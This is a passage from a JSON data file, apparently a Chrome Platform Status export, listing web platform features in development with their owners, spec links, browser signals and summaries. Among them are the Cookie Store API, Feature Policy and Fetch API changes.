      "when": "2017-06-14 18:28:55.599770",
      "by": "ericbidelman@google.com"
    },
    "name": "Color Management in Canvas",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://github.com/junov/CanvasColorSpace/blob/master/CanvasColorSpaceProposal.md",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "junov@chromium.org",
          "zakerinasab@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "http://crbug.com/634542",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "A set of new interfaces that provide color management for canvas.\r\nProviding color management for canvas allows both developers and users to take benefit from color gamuts beyond SRGB provided that the display is a high dynamic range display with a wide gamut.\r\n",
    "id": 5701580166791168,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-01-31 10:31:59.072920",
      "by": "kochi@chromium.org"
    },
    "name": "Constructable Stylesheets",
    "tags": [
      "CSS",
      "StyleSheet",
      "Custom Elements"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://tabatkins.github.io/specs/construct-stylesheets/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "kochi@chromium.org",
          "rakina@chromium.org",
          "jackalmage@gmail.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=807560",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Making CSSStyleSheet constructible from string, and making constructed CSSStyleSheets applicable to Document or ShadowRoot.\r\n\r\nA main motivation for this is to conserve duplicate memory for each instance of custom elements to be explicitly shared among them.",
    "id": 5394843094220800,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-06-05 23:44:37.320114",
      "by": "pwnall@chromium.org"
    },
    "name": "Cookie Store API",
    "tags": [
      "cookie",
      "cookies",
      "polling",
      "ServiceWorker",
      "document.cookie"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://wicg.github.io/cookie-store/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "pwnall@chromium.org",
          "jsbell@chromium.org",
          "slightlyoff@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Storage>CookiesAPI"
        ],
        "flag": false,
        "bug": "https://crbug.com/729800",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://github.com/patrickkettner/cookie-change-events",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The Cookie Store API exposes HTTP cookies to service workers and offers an asynchronous alternative to document.cookie.",
    "id": 5658847691669504,
    "resources": {
      "docs": [
        "https://wicg.github.io/cookie-store/explainer.html"
      ],
      "samples": [
        "https://wicg.github.io/cookie-store/explainer.html",
        "https://github.com/web-platform-tests/wpt/tree/master/cookie-store"
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-09-20 19:29:14.875350",
      "by": "fserb@google.com"
    },
    "name": "DOMMatrix setTransform/getTransform on 2D Canvas",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/#the-canvas-element",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "fserb@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Canvas"
        ],
        "flag": false,
        "bug": "http://crbug.com/742360",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Adding setTransform(DOMMatrix2DInit) and getTransform() do CanvasRenderingContext2D.",
    "id": 5714935250157568,
    "resources": {}
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2017-11-24 19:59:45.837230",
      "by": "tdresser@google.com"
    },
    "name": "Delayed Dispatch of PerformanceEntries",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://w3c.github.io/performance-timeline/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "tdresser@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>PerformanceAPIs"
        ],
        "flag": false,
        "bug": "http://crbug.com/778359",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Previously, we always dispatched PerformanceEntries to PerformanceObservers, via a simple PostTask. We propose to switch to dispatching these entries during idle times, or 100ms after they’ve been queued, whichever comes first.\r\n\r\nThe spec encourages this new behavior:\r\n“The performance timeline task queue is a low priority queue that, if possible, should be processed by the user agent during idle periods to minimize impact of performance monitoring code.”",
    "id": 4993617147985920,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1IBtjRvLgoN1OGcQYZISFQmeN0HShlxdm1IjmxZ-xaXw/edit?usp=sharing"
      ],
      "samples": [
        "Demo: https://output.jsbin.com/qebiseh/quiet"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:29:02.654720",
      "by": "ericbidelman@google.com"
    },
    "name": "Deprecate And Remove Support For Invalid DNS Names",
    "comments": "",
    "standards": {
      "status": {
        "text": "De-facto standard",
        "val": 1
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "palmer@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Internals>Network>DNS"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=716626",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "We have a security vulnerability that is rather long in the tooth (not yet public) that depends, in part, on our DNS resolver’s willingness to attempt to resolve arbitrary garbage strings, including strings that could not ever be valid hostnames.\r\n\r\nI propose to remove support for such requests in our DNS resolution code, and attempt only to resolve legal hostnames (“preferred name syntax”). Additionally, I propose we accept underscores (_) in names. (See the measurement CL.)\r\n\r\nNote that IDNs are P",
    "id": 5747040885669888,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/13NhCJ-AN7gGNmcJML8wYTpMo7OowcPzF2s4M_Ts5v5k/edit"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-19 05:39:40.901290",
      "by": "raymes@chromium.org"
    },
    "name": "Deprecate on-by-default Permissions in Cross-origin Iframes",
    "comments": "Spec bugs:\r\n-Geolocation: https://github.com/w3c/geolocation-api/issues/10\r\n\r\n-EME: https://github.com/w3c/encrypted-media/issues/371\r\n\r\n-Midi: https://github.com/WebAudio/web-midi-api/issues/177\r\n\r\n-Mic/Camera: https://github.com/w3c/mediacapture-main/issues/434",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "raymes@chromium.org",
          "iclelland@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>FeaturePolicy"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=689802",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "It’s proposed that by default the following permissions cannot be requested or granted to content contained in cross-origin iframes:\r\nGeolocation\r\nMidi \r\nEncrypted media extensions\r\nMicrophone and Camera\r\n\r\nIn order for a cross-origin frame to get access to these permissions, the embedding page must specify a Feature Policy which enables the feature for the frame. For example, to enable geolocation in an iframe, the embedder could specify the iframe tag as:\r\n<iframe src=\"...\" allow=\"geolocation\">",
    "id": 5023919287304192,
    "resources": {
      "docs": [
        "https://sites.google.com/a/chromium.org/dev/Home/chromium-security/deprecating-permissions-in-cross-origin-iframes"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:35.273400",
      "by": "ericbidelman@google.com"
    },
    "name": "Disable Local Playback During Audio Sharing",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "qiangchen@google.com"
        ],
        "prefixed": true,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=647801",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "We add a constraint key \"googDisableLocalEcho\" in the audio part of getUserMedia API. The parameter only works for the case the user is sharing his desktop or tab. When setting true, we will disable the local playback of the audio being shared.",
    "id": 5056629556903936,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-01-24 19:32:48.332860",
      "by": "eirage@chromium.org"
    },
    "name": "Disable touch event APIs on desktop devices by default",
    "comments": "*Can be re-enable by turning chrome://flags/#touch-events to \"enabled\"\r\n\r\n*These APIs will still be enabled with Chrome DevTools mobile emulation mode\r\n",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/touch-events/#extensions-to-the-document-interface",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "eirage@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Input"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=392584",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "On desktop devices (Mac, Windows, Linux, ChromeOS), touchevent APIs including:  \r\n- ontouch* members on window, document, Element\r\n- document.createTouch, document.createTouchList\r\n- document.createEvent(\"TouchEvent\") \r\nare disabled by default.\r\n\r\n",
    "id": 4764225348042752,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:29:10.563510",
      "by": "ericbidelman@google.com"
    },
    "name": "Disallow Media Source abort() of range removals and truncating buffered media by reducing duration",
    "tags": [
      "MSE",
      "MediaSource",
      "duration",
      "abort",
      "truncation",
      "remove"
    ],
    "comments": "Deprecation warnings will be added first to warn web authors when the newly disallowed behavior is encountered.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://w3c.github.io/media-source/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://www.w3.org/Bugs/Public/buglist.cgi?bug_status=RESOLVED&component=Media%20Source%20Extensions&f1=bug_id&f2=bug_id&f3=bug_id&j_top=OR&list_id=64149&o1=equals&o2=equals&o3=equals&product=HTML%20WG&query_format=advanced&resolution=MOVED&v1=27980&v2=27982&v3=28727",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "wolenetz@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://crbug.com/623729",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://github.com/w3c/media-source/pull/65",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Media Source spec has changed recently to disallow previously ambiguously defined behavior involving asynchronous range removals:\r\n* SourceBuffer.abort() no longer aborts SourceBuffer.remove() operations\r\n* Setting MediaSource.duration can no longer truncate currently buffered media\r\nErrors will occur in both of these cases.",
    "id": 6107495151960064,
    "resources": {
      "docs": [
        "https://github.com/w3c/media-source/pull/65",
        "https://github.com/w3c/media-source/issues/26#issuecomment-211635911",
        "https://github.com/w3c/media-source/issues/19",
        "https://github.com/w3c/media-source/issues/20"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-06-18 23:50:53.694315",
      "by": "jmedley@google.com"
    },
    "name": "Disallow sync XHR in page dismissal",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "panicker@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://docs.google.com/document/d/1G4-oIXQBcqysk4PNHBzCE4XAaGURipPTbajfx5iDIRc/edit#bookmark=id.ss4701opp5bt",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Disallow Sync XHR during page dismissal when the page is being navigated away or closed by the user. This involves the following events (when fired on the path of page dismissal) i.e. beforeunload, unload, pagehide and visibilitychange.\r\n",
    "id": 4664843055398912,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1G4-oIXQBcqysk4PNHBzCE4XAaGURipPTbajfx5iDIRc/edit#bookmark=id.ss4701opp5bt"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:29.519510",
      "by": "ericbidelman@google.com"
    },
    "name": "Do not create layout objects for elements inside display:none iframes.",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://github.com/w3c/csswg-drafts/issues/571",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "erikchen@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=650433",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The original HTML/CSS specifications were unclear about the intended behavior for elements inside display:none iframes. [Do they get CSS boxes? Are they rendered?] This has led to a divergence in behavior between UAs. The specs are in the process of being clarified, and the new spec matches the behavior of Edge and Gecko [which do not perform box construction or layout]. Note that Chrome's current behavior has negative performance implications.\r\n\r\nhttps://github.com/whatwg/html/issues/1813\r\nhttps:/",
    "id": 4692243256442880,
    "resources": {}
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:29:04.279330",
      "by": "ericbidelman@google.com"
    },
    "name": "Don't load tiny cross-origin plugin content",
    "comments": "",
    "standards": {
      "status": {
        "text": "De-facto standard",
        "val": 1
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "rschoen@chromium.org",
          "groby@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Remove tiny content exception for \"Detect and run important plugin content\" setting. This means that cross-origin plugin content that is 5x5 or smaller will not load under the default setting.",
    "id": 5759541127938048,
    "resources": {
      "docs": [
        "https://groups.google.com/a/chromium.org/d/msg/chromium-dev/QL2K4yFVg_U/vj44YWOaAwAJ",
        "https://docs.google.com/document/d/1IqaOmCgQWN1l-dgM9fSDFDQQEy_fQjs7SiqDsYjrefE/edit"
      ]
    }
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2018-04-05 22:03:16.002070",
      "by": "maxlg@chromium.org"
    },
    "name": "Event Timing Web Perf API",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "tdresser@chromium.org",
          "maxlg@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>PerformanceAPIs"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=823744",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Monitoring event latency today requires an event listener. This precludes measuring event latency early in page load, and adds unnecessary performance overhead. The Event Timing API will enable web developers to measure event latency both before and after the page load.",
    "id": 5167290693713920,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-02-05 17:24:35.066140",
      "by": "ericbidelman@google.com"
    },
    "name": "Feature Policy: Autoplay",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://github.com/WICG/feature-policy/blob/gh-pages/features.md",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "beccahughes@chromium.org",
          "mlamouri@chromium.org",
          "dahlke@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>FeaturePolicy"
        ],
        "flag": false,
        "bug": "http://crbug.com/788390",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://github.com/WICG/gesture-delegation/issues/13",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Allows developers to selectively enable and disable use of autoplay through the feature policy HTTP header or the <iframe> \"allow\" attribute.\r\n\r\nBy default we will allow autoplay on same origin iframes. If developers have cross origin iframes they will be able to enable autoplay on those frames by enabling the \"autoplay\" feature.",
    "id": 5100524789563392,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-05-30 18:08:01.625230",
      "by": "ericbidelman@google.com"
    },
    "name": "Feature Policy: JavaScript API",
    "tags": [
      "feature policy"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 1
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "loonybear@chromium.org",
          "iclelland@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>FeaturePolicy"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=703703",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Expose JavaScript API for feature policy.\r\n\r\ndocument.policy.allowedFeatures() // what are the allowed features in this document\r\ndocument.policy.allowsFeature('geolocation', <origin>?) // is geolocation allowed in this document/origin?\r\ndocument.policy.getAllowlistForFeature('geolocation') // what origins are allowed to use geolocation?",
    "id": 5190687460950016,
    "resources": {
      "docs": [
        "https://docs.google.com/a/chromium.org/document/d/1wvk3cXkblNnbkMcsKayseK-k0SMGiP9b9fQFgfpqQpc/edit?usp=sharing"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2018-04-29 05:03:20.456310",
      "by": "domfarolino@gmail.com"
    },
    "name": "Fetch API: Credentials mode default to \"same-origin\"",
    "tags": [
      "fetch",
      "credentials",
      "credentials mode",
      "fetch api",
      "request"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://fetch.spec.whatwg.org/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1394399",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "domfarolino@gmail.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Network>FetchAPI"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=759543",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/13474598/",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=176023",
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "A Request object’s credentials mode defaults to “omit” in Chrome right now. A spec change recently changed the default to “same-origin”, thus providing credentials to same-origin requests instead of omitting them.",
    "id": 4539473312350208,
    "resources": {
      "samples": [
        "https://fetch-event-echo.glitch.me"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-09-17 08:50:47.031170",
      "by": "Patket@microsoft.com"
    },
    "name": "Fetch API: Request#url includes the URL fragment",
    "tags": [
      "service",
      "worker",
      "workers",
      "serviceworker",
      "serviceworkers",
      "request",
      "fragment",
      "hash",
      "url",
      "fetch",
      "fetchevent"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://fetch.spec.whatwg.org/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1264178",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "falken@chromium.org",
          "yiyix@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Network>FetchAPI"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=624278",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Request#url now includes the URL fragment, as per the spec. Before Chrome 59, the fragment was stripped out.\r\n\r\nThis means service workers can see the URL fragment in the 'fetch' event handler.",
    "id": 4753419730419712,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Request/url",
        "https://github.com/w3c/ServiceWorker/issues/854",
        "https://github.com/whatwg/fetch/issues/214"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2018-05-30 04:12:45.313710",
      "by": "yhirano@chromium.org"
    },
    "name": "Fetch API: Request.isHistoryNavigation",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://fetch.spec.whatwg.org/#dom-request-ishistorynavigation",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "yhirano@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Network>FetchAPI"
        ],
        "flag": false,
        "bug": "https://crbug.com/842551",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "A property which represents whether the request is for history navigation. This property is used in a service worker.",
    "id": 4668970653188096,
    "resources": {}
  },
  {
    "category": "File APIs",
    "updated": {
      "when": "2017-06-14 18:29:17.805490",
      "by": "ericbidelman@google.com"
    },
    "name": "FileSystem interfaces for directory upload",
    "tags": [
      "FileSystem",
      "Directory Upload",
      "FileAPI"
    ],
    "comments": "",
